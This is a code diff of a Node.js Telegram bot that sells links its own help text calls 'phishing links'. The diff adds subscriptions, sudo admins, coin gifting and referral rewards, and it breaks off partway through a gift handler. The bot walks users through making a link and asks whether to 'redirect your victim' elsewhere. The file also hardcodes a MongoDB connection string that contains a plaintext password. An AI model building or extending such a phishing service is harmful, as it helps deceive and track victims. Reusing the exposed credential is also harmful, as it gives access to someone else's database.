@@ -1,7 +1,6 @@
 /**
- * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v10.0 (Merged & Fixed)
- * Features: All Old Info + New Group Logic + Auto Cam/Info + Web Fixed + WebView/Permissions + Admin Reset
- * NEW: Advanced Referral System + Share Toggle + Support Buttons
+ * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v11.0 (Super Advanced)
+ * Features: Referral Update, Subs/Time-based Access, Gift, Sudo, Adv Broadcast, Images, UI Tweaks
  */
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -19,6 +18,9 @@ const CHANNEL_ID1 = "@alphacodex369";
 const CHANNEL_ID2 = "@Termuxcodex";
 const GROUP_ID = "@Codex_teamx"; 
 const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority";
+
+// 🖼 IMAGES
+const START_IMG_URL = "https://graph.org/file/438f093fd5762d3c3206e-82b7d5ec9f9be10bde.jpg";
 
 const bot = new TelegramBot(TOKEN, { polling: true });
 const app = express();
@@ -42,8 +44,10 @@ const userSchema = new mongoose.Schema({
     freeUrlsLeft: { type: Number, default: 4 }, 
     isBanned: { type: Boolean, default: false },
     joinedAt: { type: Date, default: Date.now },
-    referredBy: { type: Number, default: null }, // NEW: Track who invited
-    referralCount: { type: Number, default: 0 }  // NEW: Total successful invites
+    referredBy: { type: Number, default: null },
+    referralCount: { type: Number, default: 0 },
+    subscriptionExpiry: { type: Date, default: null }, // NEW: Subscription Time
+    isSudo: { type: Boolean, default: false } // NEW: Sudo Access
 });
 
 const linkSchema = new mongoose.Schema({
@@ -57,10 +61,8 @@ const linkSchema = new mongoose.Schema({
 const User = mongoose.model('User', userSchema);
 const Link = mongoose.model('Link', linkSchema);
 
-// [IMPORTANT FIX] Global state variable defined here
 const userState = {};
 
-// NEW: Global Settings
 let shareSystemEnabled = true;
 let botUsername = "DX_CODEX_BOT";
 bot.getMe().then(me => botUsername = me.username);
@@ -82,12 +84,7 @@ function makeBorder(title, content) {
 
 function escapeHtml(text) {
     if (!text) return text;
-    return text.toString()
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#39;");
+    return text.toString().replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
 }
 
 async function resolveUser(msg, input) {
@@ -98,6 +95,24 @@ async function resolveUser(msg, input) {
         return await User.findOne({ username: { $regex: new RegExp(`^${cleanInput}$`, 'i') } });
     }
     return null;
+}
+
+async function checkAdmin(userId) {
+    if (OWNER_IDS.includes(userId)) return true;
+    const u = await User.findOne({ chatId: userId });
+    return u && u.isSudo;
+}
+
+function hasActiveSub(user) {
+    return user.subscriptionExpiry && user.subscriptionExpiry > Date.now();
+}
+
+function getSubTimeLeft(user) {
+    if (!hasActiveSub(user)) return null;
+    const diff = user.subscriptionExpiry - Date.now();
+    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    return `${days} ᴅᴀʏs, ${hours} ʜᴏᴜʀs`;
 }
 
 // ─── 🤖 BOT LOGIC (START & MEMBERSHIP) ──────────────────
@@ -119,7 +134,6 @@ async function checkMembership(chatId) {
     } catch (e) { return { allJoined: false }; }
 }
 
-// 1. START COMMAND (UPDATED WITH REFERRAL)
 bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     if (msg.chat.type !== 'private') return;
@@ -134,22 +148,21 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                 firstName: escapeHtml(msg.from.first_name) || "User" 
             });
 
-            // Referral Logic
+            // Advanced Referral Logic (2 users = 1 free coin)
             if (match[1] && !isNaN(match[1]) && match[1] != chatId) {
                 user.referredBy = parseInt(match[1]);
             }
             await user.save();
 
-            // Reward Inviter (Only if enabled)
             if (shareSystemEnabled && user.referredBy) {
                 const referrer = await User.findOne({ chatId: user.referredBy });
                 if (referrer) {
                     referrer.referralCount += 1;
                     if (referrer.referralCount % 2 === 0) {
-                        referrer.coins += 1;
-                        bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ᴄᴏɪɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
+                        referrer.freeUrlsLeft += 1; // Gives 1 free URL/Coin for creating links
+                        bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ sᴜᴄᴄᴇss", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ғʀᴇᴇ ᴄᴏɪɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
                     } else {
-                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ᴀ ᴄᴏɪɴ.`), {parse_mode:'HTML'});
+                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ ᴛʀᴀᴄᴋ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ᴀ ғʀᴇᴇ ᴄᴏɪɴ.`), {parse_mode:'HTML'});
                     }
                     await referrer.save();
                 }
@@ -169,7 +182,6 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
     } catch (error) { console.log(error); }
 });
 
-// 2. MAIN MENU
 async function showMainMenu(msg) {
     const chatId = msg.chat.id || msg.from.id;
     const cleanName = escapeHtml(msg.from.first_name || "User");
@@ -193,11 +205,12 @@ async function showMainMenu(msg) {
 ┃ ┃ 4️⃣ <b>sʜᴀʀᴇ ʟɪɴᴋ & ɢᴇᴛ ɪɴsᴛᴀɴᴛ ᴅᴀᴛᴀ</b>
 ┃ ┗───────────╼
 ┃ <b>┏─「 sʏsᴛᴇᴍ ɪɴғᴏ 」</b>
-┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: DX-CODEX</b>
+┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: Ｄｘ－Ｓｉｍｕ</b>
 ┃ ┗───────────╼
 <b>┗━━━━━━━━━━┛</b>`;
 
-    await bot.sendMessage(chatId, content, {
+    await bot.sendPhoto(chatId, START_IMG_URL, {
+        caption: content,
         parse_mode: 'HTML',
         reply_markup: { 
             keyboard: [
@@ -209,7 +222,6 @@ async function showMainMenu(msg) {
         }
     });
 
-    // NEW: Support button sent as a mini message after main menu
     await bot.sendMessage(chatId, `💬 <b>ɴᴇᴇᴅ ʜᴇʟᴘ ᴏʀ sᴜᴘᴘᴏʀᴛ?</b>`, {
         parse_mode: 'HTML',
         reply_markup: {
@@ -218,7 +230,6 @@ async function showMainMenu(msg) {
     });
 }
 
-// 3. VERIFICATION MENU
 async function showVerificationMenu(msg) {
     const chatId = msg.chat.id || msg.from.id;
     const cleanName = escapeHtml(msg.from.first_name || "User");
@@ -229,12 +240,13 @@ async function showVerificationMenu(msg) {
 ┃ ┃ 🆔 <b>ɪᴅ:</b> <code>${chatId}</code>
 ┃ ┗───────────╼
 ┃ <b>┏─「 sʏsᴛᴇᴍ ɪɴғᴏ 」</b>
-┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: DX-CODEX</b>
+┃ ┃ 👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ: Ｄｘ－Ｓｉｍｕ</b>
 ┃ ┗───────────╼
 <b>┗━━━━━━━━━━┛</b>
 <blockquote><b>📢: ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs</b></blockquote>`;
 
-    await bot.sendMessage(chatId, dashboard, {
+    await bot.sendPhoto(chatId, START_IMG_URL, {
+        caption: dashboard,
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [
@@ -247,99 +259,34 @@ async function showVerificationMenu(msg) {
     });
 }
 
-        
 // ─── 📩 MESSAGES & STATES ─────────────────────────────────
 
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
 
-    // Admin Commands Bypass (Group/DM)
-    if (text && (text.startsWith('/add') || text.startsWith('/rem') || text.startsWith('/rm') || text.startsWith('/reset') || text.startsWith('/ban') || text.startsWith('/unban') || text.startsWith('/users') || text.startsWith('/share'))) return;
+    if (text && (text.startsWith('/add') || text.startsWith('/rem') || text.startsWith('/rm') || text.startsWith('/reset') || text.startsWith('/ban') || text.startsWith('/unban') || text.startsWith('/users') || text.startsWith('/share') || text.startsWith('/sudo') || text.startsWith('/gift'))) return;
     if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);
 
     if (!text) return;
 
-    // Check Ban
     const user = await User.findOne({ chatId: msg.from.id });
     if (user && user.isBanned) return;
 
-    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ") {
-        if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
-            return bot.sendMessage(chatId, makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", `<b>🚫: ғʀᴇᴇ ᴛʀɪᴀʟ ᴇɴᴅᴇᴅ\n💰: ʙᴜʏ ᴄᴏɪɴs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ</b>`), {
-                parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]] }
-            });
-        }
-        const info = `<b>👤:</b> <code>${user.firstName}</code>\n<b>🎁: ${user.freeUrlsLeft} ғʀᴇᴇ\n💰: ${user.coins} ᴄᴏɪɴs\n👇: ᴄʜᴏᴏsᴇ ᴛʏᴘᴇ\n┏━━━━━━━━━━┓\n┃ᴇɴᴛᴇʀ ᴀ sʜᴏʀᴛ ɴᴀᴍᴇ ɢᴏʀ ʟɪɴᴋ\n┃ᴄʜᴏsᴇ: ᴄᴜsᴛᴏᴍ & ʀᴀɴᴅᴏᴍ\n┗━━━━━━━━━━┛</b>`;
-        bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", info), {
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
-        });
+    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" || text === "/create") {
+        handleCreateUrl(chatId, user);
     } 
-    else if (text === "👤 ᴍʏ ɪɴғᴏ") {
-        const activeLinkCount = await Link.countDocuments({ creatorChatId: chatId });
-        const joinDate = user.joinedAt ? new Date(user.joinedAt).toLocaleDateString() : "N/A";
-        
-        let freeLine = "";
-        if (user.freeUrlsLeft > 0) {
-            freeLine = `<b>┃ ┃ 🎁 ғʀᴇᴇ: ${user.freeUrlsLeft}</b>\n`;
-        }
-
-        const titleMain = _fnt("YOUR INFO");
-        const titleProf = _fnt("USER PROFILE");
-        const titleDet = _fnt("PROFILE DETAILS"); 
-        const btnText = _fnt("ʙᴜʏ ᴄᴏɪɴ");
-
-        const infoMsg = 
-`<b>┏━━「 ${titleMain} 」━━┓</b>
-<b>┃ ┏─「 ${titleProf} 」</b>
-<b>┃ ┃ 👤 ɴᴀᴍᴇ: ${user.firstName}</b>
-<b>┃ ┃ 🆔 ɪᴅ: <code>${user.chatId}</code></b>
-<b>┃ ┗───────────╼</b>
-<b>┃</b> 
-<b>┃ ┏─「 ${titleDet} 」</b>
-<b>┃ ┃ 💰 ᴄᴏɪɴs: ${user.coins}</b>
-${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
-<b>┃ ┃ 📅 ᴅᴀᴛᴇ: ${joinDate}</b>
-<b>┃ ┃ 🔗 ʟɪɴᴋs: ${activeLinkCount}</b>
-<b>┃ ┗───────────╼</b>
-<b>┗━━━━━━━━━━┛</b>`;
-
-        bot.sendMessage(chatId, infoMsg, { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: `📢 ${btnText}`, url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]
-                ]
-            }
-        });
+    else if (text === "👤 ᴍʏ ɪɴғᴏ" || text === "/info") {
+        handleInfo(chatId, user);
     }
-    else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ") {
-        // NEW: Support Button added to Developer Menu
-        bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { 
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
-            }
-        });
+    else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" || text === "/dev") {
+        handleDev(chatId);
     }
-    else if (text === "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ") {
-        // NEW: Share/Referral Menu logic
-        const shareText = `<b>┏━━「 ${_fnt("REFERRAL SYSTEM")} 」━━┓</b>\n` +
-                          `┃ 🚀 <b>ɪɴᴠɪᴛᴇ ғʀɪᴇɴᴅs & ᴇᴀʀɴ!</b>\n` +
-                          `┃ 👥 <b>ғᴏʀ ᴇᴠᴇʀʏ 2 ɴᴇᴡ ᴜsᴇʀs:</b>\n` +
-                          `┃ 💰 <b>ʏᴏᴜ ɢᴇᴛ 1 ғʀᴇᴇ ᴄᴏɪɴ!</b>\n` +
-                          `┃\n` +
-                          `┃ 📊 <b>ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs:</b> <code>${user.referralCount || 0}</code>\n` +
-                          `<b>┗━━━━━━━━━━━━━━━┛</b>\n\n` +
-                          `👇 <b>ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ʏᴏᴜʀ ʟɪɴᴋ!</b>`;
-        
-        const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
-        bot.sendMessage(chatId, shareText, {
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
-        });
+    else if (text === "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" || text === "/referral") {
+        handleShare(chatId, user);
+    }
+    else if (text === "/help") {
+        handleHelp(chatId);
     }
     
     // Custom Link Steps
@@ -359,6 +306,111 @@ ${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
     }
 });
 
+// HANDLERS
+async function handleCreateUrl(chatId, user) {
+    const isSub = hasActiveSub(user);
+    if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
+        return bot.sendMessage(chatId, makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", `<b>🚫: ғʀᴇᴇ ᴛʀɪᴀʟ ᴇɴᴅᴇᴅ\n💰: ʙᴜʏ ᴄᴏɪɴs ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ</b>`), {
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]] }
+        });
+    }
+    
+    let balText = isSub ? `<b>💎 sᴜʙsᴄʀɪᴘᴛɪᴏɴ:</b> <code>${getSubTimeLeft(user)}</code>` : `<b>🎁 ғʀᴇᴇ:</b> <code>${user.freeUrlsLeft}</code>\n<b>┃ 💰 ᴄᴏɪɴs:</b> <code>${user.coins}</code>`;
+    
+    const info = `<b>👤:</b> <code>${user.firstName}</code>
+┃ ${balText}
+┃ <b>┏─「 ɪɴsᴛʀᴜᴄᴛɪᴏɴs 」</b>
+┃ ┃ 3️⃣ <b>ʀᴀɴᴅᴏᴍ:</b> sʏsᴛᴇᴍ ᴡɪʟʟ ᴍᴀᴋᴇ ᴀ ɴᴀᴍᴇ
+┃ ┃ 4️⃣ <b>ᴀғᴛᴇʀ ᴛʜᴀᴛ:</b> ʏᴏᴜ ᴄᴀɴ sᴇᴛ ʀᴇᴅɪʀᴇᴄᴛ
+┃ ┗───────────╼
+┃ <b>⚠️ ɴᴏᴛᴇ: ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ ᴍᴜsᴛ ʙᴇ 𝟹+ ʟᴇᴛᴛᴇʀs</b>`;
+
+    bot.sendMessage(chatId, makeBorder("ᴄʀᴇᴀᴛᴇ ᴜʀʟ", info), {
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
+    });
+}
+
+async function handleInfo(chatId, user) {
+    const activeLinkCount = await Link.countDocuments({ creatorChatId: chatId });
+    const joinDate = user.joinedAt ? new Date(user.joinedAt).toLocaleDateString() : "N/A";
+    
+    let subData = "";
+    if (hasActiveSub(user)) {
+        subData = `<b>┃ ┃ 💎 sᴜʙsᴄʀɪᴘᴛɪᴏɴ: ${getSubTimeLeft(user)}</b>\n`;
+    } else {
+        subData = `<b>┃ ┃ 💰 ᴄᴏɪɴs: ${user.coins}</b>\n<b>┃ ┃ 🎁 ғʀᴇᴇ: ${user.freeUrlsLeft}</b>\n`;
+    }
+
+    const infoMsg = 
+`<b>┏━━「 ${_fnt("YOUR INFO")} 」━━┓</b>
+<b>┃ ┏─「 ${_fnt("USER PROFILE")} 」</b>
+<b>┃ ┃ 👤 ɴᴀᴍᴇ: ${user.firstName}</b>
+<b>┃ ┃ 🆔 ɪᴅ: <code>${user.chatId}</code></b>
+<b>┃ ┗───────────╼</b>
+<b>┃</b> 
+<b>┃ ┏─「 ${_fnt("PROFILE DETAILS")} 」</b>
+${subData}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
+<b>┃ ┃ 📅 ᴅᴀᴛᴇ: ${joinDate}</b>
+<b>┃ ┃ 🔗 ʟɪɴᴋs: ${activeLinkCount}</b>
+<b>┃ ┗───────────╼</b>
+<b>┗━━━━━━━━━━┛</b>`;
+
+    bot.sendMessage(chatId, infoMsg, { 
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: `📢 ${_fnt("ʙᴜʏ ᴄᴏɪɴ")}`, url: `https://t.me/dx_codex?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]
+            ]
+        }
+    });
+}
+
+function handleDev(chatId) {
+    bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { 
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
+        }
+    });
+}
+
+function handleShare(chatId, user) {
+    const shareText = `<b>┏━━「 ${_fnt("REFERRAL SYSTEM")} 」━━┓</b>\n` +
+                      `┃ 🚀 <b>ɪɴᴠɪᴛᴇ ғʀɪᴇɴᴅs & ᴇᴀʀɴ!</b>\n` +
+                      `┃ 👥 <b>ғᴏʀ ᴇᴠᴇʀʏ 2 ɴᴇᴡ ᴜsᴇʀs:</b>\n` +
+                      `┃ 💰 <b>ʏᴏᴜ ɢᴇᴛ 1 ғʀᴇᴇ ᴄᴏɪɴ!</b>\n` +
+                      `┃\n` +
+                      `┃ 📊 <b>ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs:</b> <code>${user.referralCount || 0}</code>\n` +
+                      `<b>┗━━━━━━━━━━━━━━━┛</b>\n\n` +
+                      `👇 <b>ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ʏᴏᴜʀ ʟɪɴᴋ!</b>`;
+    
+    const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
+    bot.sendMessage(chatId, shareText, {
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
+    });
+}
+
+function handleHelp(chatId) {
+    const helpText = `<b>┏━━「 ${_fnt("HELP MENU")} 」━━┓</b>
+┃ <b>┏─「 ᴜsᴇʀ ᴄᴏᴍᴍᴀɴᴅs 」</b>
+┃ ┃ 🔹 /create - <code>Make Custom URL</code>
+┃ ┃ 🔹 /info - <code>View Profile</code>
+┃ ┃ 🔹 /referral - <code>Share & Earn</code>
+┃ ┃ 🔹 /dev - <code>Developer Info</code>
+┃ ┃ 🔹 /gift 10 [id] - <code>Gift coins to user</code>
+┃ ┗───────────╼
+┃ <b>┏─「 ʙᴜᴛᴛᴏɴs ᴜsᴀɢᴇ 」</b>
+┃ ┃ 🔘 <b>ᴄʀᴇᴀᴛᴇ ᴜʀʟ:</b> Make new phishing links
+┃ ┃ 🔘 <b>ᴍʏ ɪɴғᴏ:</b> Check your active stats/coins
+┃ ┃ 🔘 <b>sʜᴀʀᴇ & ᴇᴀʀɴ:</b> Get link to refer friends
+┃ ┗───────────╼
+<b>┗━━━━━━━━━━┛</b>`;
+    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
+}
+
 // Callbacks 
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
@@ -371,9 +423,7 @@ bot.on('callback_query', async (query) => {
             if (allJoined) {
                 await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" });
 
-                try {
-                    await bot.deleteMessage(chatId, msg.message_id);
-                } catch (e) { /* message already deleted */ }
+                try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) { }
 
                 const user = await User.findOne({ chatId });
                 const name = escapeHtml(user.firstName || "User");
@@ -389,7 +439,6 @@ bot.on('callback_query', async (query) => {
 🔗 <b>ɪғ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ᴜʀʟ</b>
       <b>ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ</b>`;
 
-                // NEW: Support Button added beside Custom URL creation after verification
                 await bot.sendMessage(chatId, makeBorder(title, body), {
                     parse_mode: 'HTML',
                     reply_markup: {
@@ -400,7 +449,6 @@ bot.on('callback_query', async (query) => {
                     }
                 });
 
-                // Set keyboard for future text interactions
                 await bot.sendMessage(chatId, `⌨️ <b>ᴍᴇɴᴜ ᴋᴇʏʙᴏᴀʀᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ.</b>`, {
                     parse_mode: 'HTML',
                     reply_markup: {
@@ -413,15 +461,9 @@ bot.on('callback_query', async (query) => {
                     }
                 });
             } else {
-                bot.answerCallbackQuery(query.id, { 
-                    text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", 
-                    show_alert: true 
-                });
+                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true });
             }
-        } catch (error) {
-            console.error(error);
-            bot.answerCallbackQuery(query.id, { text: "⚠️ Server Error!" });
-        }
+        } catch (error) {}
     }
     else if (data === 'create_custom') {
         userState[chatId] = { step: 'await_custom_name' };
@@ -442,7 +484,7 @@ bot.on('callback_query', async (query) => {
 function askRedirect(msg, name) {
     const chatId = msg.from ? msg.from.id : msg.chat.id;
     userState[chatId] = { name: name, step: 'await_choice' };
-    bot.sendMessage(chatId, makeBorder("ᴏᴘᴛɪᴏɴ", `<b>📝: ɴᴀᴍᴇ:</b> <code>${name}</code>\n<b>❓: ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴅɪʀᴇᴄᴛ\nʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴛᴏ ᴀɴᴏᴛʜᴇʀ ᴜʀʟ?</b>`), {
+    bot.sendMessage(chatId, `<b>┏━━「 ${_fnt("OPTION")} 」━━┓</b>\n┃ 📝: <b>ɴᴀᴍᴇ:</b> <code>${name}</code>\n┃ ❓: <b>ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴅɪʀᴇᴄᴛ</b>\n┃ <b>ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴛᴏ ᴀɴᴏᴛʜᴇʀ ᴜʀʟ?</b>\n<b>┗━━━━━━━━━━┛</b>`, {
         parse_mode: 'HTML',
         reply_markup: { inline_keyboard: [[{ text: "✅ ʏᴇs", callback_data: "use_redirect" }, { text: "❌ ɴᴏ", callback_data: "no_redirect" }]] }
     });
@@ -452,42 +494,125 @@ async function createFinalLink(msg, name, redirectUrl) {
     const chatId = msg.from ? msg.from.id : msg.chat.id;
     const user = await User.findOne({ chatId });
     
-    if (user.freeUrlsLeft <= 0 && user.coins <= 0) {
+    const isSub = hasActiveSub(user);
+    
+    if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
         delete userState[chatId];
         return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴏ ᴄᴏɪɴs/ᴛʀɪᴀʟs ʟᴇғᴛ!"), { parse_mode:'HTML' });
     }
 
-    if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
-    await user.save();
+    if (!isSub) {
+        if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
+        await user.save();
+    }
 
     await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl }).save();
     delete userState[chatId];
     
     const url = `https://code-url-b0f2.onrender.com/w/${name}`;
+    let bal = isSub ? `sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴄᴛɪᴠᴇ` : `ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins} ᴄᴏɪɴs, ${user.freeUrlsLeft} ғʀᴇᴇ`;
     
-    bot.sendMessage(chatId, makeBorder("✅ sᴜᴄᴄᴇss", `🔗: ${url}\n\n🔄: ${redirectUrl || 'N/A'}\n💰: ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins}`), { parse_mode: 'HTML' });
+    bot.sendMessage(chatId, `<b>┏━━「 ✅ ${_fnt("SUCCESS")} 」━━┓</b>\n┃ 🔗: ${url}\n┃ \n┃ 🔄: ${redirectUrl || 'N/A'}\n┃ 💰: ${bal}\n<b>┗━━━━━━━━━━┛</b>`, { parse_mode: 'HTML' });
 }
 
-// ─── 👑 ADMIN COMMANDS ───────────
+// ─── 🎁 USER GIFT SYSTEM ───────────
 
-// NEW: Admin Toggle for Share System
-bot.onText(/\/share\s+(on|off)/i, (msg, match) => {
+bot.onText(/\/gift\s+(\d+)\s+(.+)/, async (msg, match) => {
+    const amount = parseInt(match[1]);
+    const inputTarget = match[2];
+    
+    const sender = await User.findOne({ chatId: msg.from.id });
+    if (!sender || sender.coins < amount) {
